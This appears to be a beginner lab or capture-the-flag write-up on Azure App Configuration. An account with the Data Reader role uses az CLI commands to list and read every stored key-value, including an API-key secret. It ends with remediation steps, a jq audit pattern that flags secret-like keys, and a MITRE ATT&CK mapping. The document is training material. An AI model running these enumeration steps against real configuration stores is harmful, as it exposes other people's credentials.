# App Configuration — Data Reader Enumeration

**Difficulty:** Beginner | **Provider:** Azure | **Category:** Configuration / Secrets

## Scenario

A team uses **Azure App Configuration** as a central store for application settings,
including database credentials and API keys. The store was created with free-tier
access and an attacker account was granted **App Configuration Data Reader** to allow
the application to fetch its own config.

App Configuration Data Reader grants `Microsoft.AppConfiguration/configurationStores/*/read`
on all key-values in the store — so any identity with this role can enumerate every
key and value, including secrets that were intended only for the application runtime.

## Attack Path

```
[Attacker] Azure AD user (App Configuration Data Reader on the store)
    |
    v
az appconfig kv list --name <store> --auth-mode login
    |
    v
All key-value pairs returned in plaintext  -->  secrets/api-key value  -->  flag
```

### Step 1 — Login as the attacker

```bash
az login --username <attacker_upn> --password <attacker_password>
```

### Step 2 — List all key-values

```bash
CONFIG_STORE="<config_store_name>"

az appconfig kv list \
  --name "${CONFIG_STORE}" \
  --auth-mode login \
  --output table
```

### Step 3 — Read a specific key

```bash
az appconfig kv show \
  --name "${CONFIG_STORE}" \
  --key "secrets/api-key" \
  --auth-mode login \
  --query "value" \
  --output tsv
```

## How to Fix in Production

1. **Separate configuration tiers** — store non-sensitive configuration in App
   Configuration but keep secrets exclusively in Key Vault. Reference Key Vault
   secrets from App Configuration using Key Vault references.
2. **Apply least-privilege** — grant `App Configuration Data Reader` only to the
   managed identities of the applications that need specific key prefixes, not to
   human operators.
3. **Use label-based access control** — scope Reader assignments to specific labels
   (e.g. `production`) using ABAC conditions.
4. **Audit key-value contents** regularly for secrets that should live in Key Vault:
   ```bash
   az appconfig kv list --name <store> --auth-mode login | \
     jq '.[] | select(.value | test("(?i)(pass|key|secret|token)"))'
   ```

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
